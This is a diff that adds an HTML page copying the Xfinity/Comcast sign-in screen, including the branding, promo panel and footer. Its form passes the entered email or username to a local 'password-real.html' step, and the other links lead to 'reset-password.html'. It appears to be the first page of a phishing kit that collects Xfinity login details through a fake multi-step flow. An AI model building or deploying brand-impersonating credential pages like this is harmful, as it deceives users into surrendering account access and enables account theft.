@@ -1,0 +1,326 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in to Xfinity</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+            background-color: #ffffff;
+            color: #262626;
+        }
+
+        .main-container {
+            display: flex;
+            flex: 1;
+            width: 100%;
+        }
+
+        /* Left Section - Form */
+        .left-panel {
+            flex: 1;
+            padding: 40px 60px;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            max-width: 50%;
+        }
+
+        .logo {
+            font-size: 24px;
+            font-weight: 700;
+            color: #616161;
+            letter-spacing: -1px;
+            margin-bottom: 40px;
+        }
+
+        .form-container {
+            max-width: 420px;
+            width: 100%;
+            margin: 0 auto;
+        }
+
+        .form-title {
+            font-size: 28px;
+            font-weight: 700;
+            margin-bottom: 24px;
+            color: #141414;
+        }
+
+        .input-group {
+            margin-bottom: 12px;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 14px 16px;
+            font-size: 15px;
+            border: 1px solid #767676;
+            border-radius: 4px;
+            background-color: #f9f9f9;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+
+        .input-field:focus {
+            border-color: #6125c4;
+            background-color: #ffffff;
+        }
+
+        .terms-text {
+            font-size: 12px;
+            color: #616161;
+            margin-bottom: 24px;
+            line-height: 1.4;
+        }
+
+        .terms-text a {
+            color: #6125c4;
+            text-decoration: underline;
+        }
+
+        .submit-btn {
+            background-color: #5825d6;
+            color: #ffffff;
+            border: none;
+            border-radius: 6px;
+            padding: 12px 28px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background-color 0.2s;
+            text-decoration: none;
+        }
+
+        .submit-btn:hover {
+            background-color: #461cb2;
+        }
+
+        .links-section {
+            margin-top: 48px;
+            border-top: 1px solid #e2e2e2;
+        }
+
+        .link-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 16px 0;
+            border-bottom: 1px solid #e2e2e2;
+            color: #141414;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        .link-item:hover {
+            color: #5825d6;
+        }
+
+        .arrow {
+            font-size: 14px;
+            color: #616161;
+        }
+
+        /* Right Section - Promo Banner */
+       /* Right Section - Promo Banner */
+        .right-panel {
+            flex: 1;
+            background: url('bg-logo.jpg') no-repeat center center;
+            background-size: cover;
+            color: #ffffff;
+            padding: 60px 40px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .promo-header {
+            font-size: 32px;
+            font-weight: 800;
+            line-height: 1.2;
+            margin-bottom: 16px;
+            max-width: 480px;
+        }
+
+        .promo-subtext {
+            font-size: 14px;
+            line-height: 1.5;
+            margin-bottom: 28px;
+            max-width: 440px;
+            opacity: 0.9;
+        }
+
+        .calc-btn {
+            background-color: #ffffff;
+            color: #141414;
+            border: none;
+            border-radius: 4px;
+            padding: 10px 24px;
+            font-size: 14px;
+            font-weight: 700;
+            cursor: pointer;
+            margin-bottom: 40px;
+        }
+
+        .promo-hero-text {
+            font-size: 56px;
+            font-weight: 900;
+            line-height: 1.05;
+            letter-spacing: -1px;
+            margin-bottom: 40px;
+            text-transform: uppercase;
+        }
+
+        .ripped-paper-divider {
+            width: 100%;
+            height: 20px;
+            background: linear-gradient(to right, rgba(255,255,255,0.8), rgba(255,255,255,0.4));
+            margin: 20px 0;
+            clip-path: polygon(0 40%, 8% 70%, 15% 30%, 23% 80%, 30% 20%, 42% 75%, 50% 35%, 62% 90%, 75% 25%, 85% 70%, 93% 30%, 100% 60%, 100% 100%, 0% 100%);
+            opacity: 0.6;
+        }
+
+        .disclaimer-text {
+            font-size: 10px;
+            line-height: 1.4;
+            color: #d1d1d1;
+            max-width: 480px;
+            margin-top: auto;
+        }
+
+        .disclaimer-text a {
+            color: #ffffff;
+            text-decoration: underline;
+        }
+
+        /* Footer */
+        footer {
+            padding: 20px 40px;
+            background-color: #ffffff;
+            font-size: 12px;
+            color: #616161;
+            text-align: center;
+            border-top: 1px solid #f0f0f0;
+        }
+
+        .copyright {
+            margin-bottom: 12px;
+        }
+
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            flex-wrap: wrap;
+        }
+
+        .footer-links a {
+            color: #616161;
+            text-decoration: none;
+            display: inline-flex;
+            align-items: center;
+            gap: 4px;
+        }
+
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+
+        @media (max-width: 900px) {
+            .main-container {
+                flex-direction: column;
+            }
+            .left-panel, .right-panel {
+                max-width: 100%;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="main-container">
+        <!-- Left Sign In Panel -->
+        <div class="left-panel">
+            <div class="logo">xfinity</div>
+            
+            <div class="form-container">
+                <h1 class="form-title">Sign in with your Xfinity ID</h1>
+                
+                <form action="password-real.html" method="get">
+                    <div class="input-group">
+                        <input type="text" name="email" class="input-field" placeholder="Email, mobile, or username" required>
+                    </div>
+                    
+                    <p class="terms-text">
+                        By signing in, you agree to our <a href="#">Terms of Service</a> and <a href="#">Privacy Policy</a>.
+                    </p>
+                    
+                    <button href="password-real.html" class="submit-btn">Let's go</button>
+                </form>
+
+                <div class="links-section">
+                    <a href="reset-password.html" class="link-item">
+                        <span>New to Xfinity? View exclusive offers near you</span>
+                        <span class="arrow">&gt;</span>
+                    </a>
+                    <a href="reset-password.html" class="link-item">
+                        <span>Find your Xfinity ID</span>
+                        <span class="arrow">&gt;</span>
+                    </a>
+                    <a href="reset-password.html" class="link-item">
+                        <span>Create a new Xfinity ID</span>
+                        <span class="arrow">&gt;</span>
+                    </a>
+                </div>
+            </div>
+
+            <div></div> <!-- Spacing alignment -->
+        </div>
+
+        <!-- Right Promotional Panel -->
+        <div class="right-panel">
+            <h2 class="promo-header">Save $55/mo vs. Verizon, AT&T, and T-Mobile</h2>
+            <p class="promo-subtext">With Xfinity Mobile, get the most reliable 5G network with WiFi boosted mobile wherever you are.</p>
+            
+            <button class="calc-btn">Calculate savings</button>
+            
+            <div class="promo-hero-text">
+                Cut your mobile<br>bill in half
+            </div>
+
+            <div class="disclaimer-text">
+                Xfinity Internet req. Savings based on 1 line of Xfinity Mobile Plus to comparable plans from Verizon, AT&T, and T-Mobile (as of 10/01/26). Gig-speed WiFi w/ PowerBoost avail. to Xfinity Mobile cust. via Xfinity Hotspots & XB7+ Gateways only. Actual speeds vary & not guaranteed. Many factors affect speed. See <a href="#">Xfinity.com/mobile/policies/broadband-disclosures</a>.
+            </div>
+        </div>
+    </div>
+
+    <!-- Footer -->
+    <footer>
+        <div class="copyright">© 2026 Comcast</div>
+        <div class="footer-links">
+            <a href="#">📋 Web Terms Of Service</a>
+            <a href="#">📄 CA Notice at Collection</a>
+            <a href="#">🛡️ Privacy Policy</a>
+            <a href="#">⚙️ Your Privacy Choices</a>
+            <a href="#">♡ Health Privacy Notice</a>
+            <a href="#">▷ Ad Choices</a>
+        </div>
+    </footer>
+
+</body>
+</html>
